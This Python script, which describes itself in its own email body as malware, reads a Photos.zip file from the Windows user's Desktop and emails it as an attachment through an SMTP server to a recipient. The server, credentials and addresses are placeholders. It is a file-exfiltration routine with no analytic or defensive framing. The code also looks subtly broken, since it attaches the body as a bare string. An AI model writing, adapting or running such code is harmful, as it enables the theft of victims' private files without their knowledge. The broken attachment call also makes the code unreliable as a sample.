import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os

smtp_server = 'smtp.your-email-provider.com'
smtp_port = 587
smtp_user = 'your_email@example.com'
smtp_password = 'your_email_password'

from_email = 'your_email@example.com'
to_email = 'recipient@example.com'
subject = 'Subject: ZIP attachment'
body = 'Someone used your malware'

def get_zip_file_path(base_directory: str, zip_name: str = "Photos.zip"):
    return os.path.expandvars(os.path.join(base_directory, zip_name))

def create_email(subject: str, body: str, from_email: str, to_email: str, file_path: str):
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject
    msg.attach(body)

    try:
        attachment = open(file_path, 'rb')
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_path)}')
        msg.attach(part)
        attachment.close()
    except Exception as e:
        print(f"Error attaching the file: {e}")
        return None

    return msg

def send_email(msg, smtp_server, smtp_port, smtp_user, smtp_password, from_email, to_email):
    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()  # Start TLS encryption
        server.login(smtp_user, smtp_password)
        server.sendmail(from_email, to_email, msg.as_string())
        server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print(f"Error: {e}")

def main():
    base_directory = '%USERPROFILE%\\Desktop' 
    zip_file_path = get_zip_file_path(base_directory) 
    
    print(f"Attaching file: {zip_file_path}")
    
    msg = create_email(subject, body, from_email, to_email, zip_file_path)
    
    if msg:
        send_email(msg, smtp_server, smtp_port, smtp_user, smtp_password, from_email, to_email)

if __name__ == "__main__":
    main()
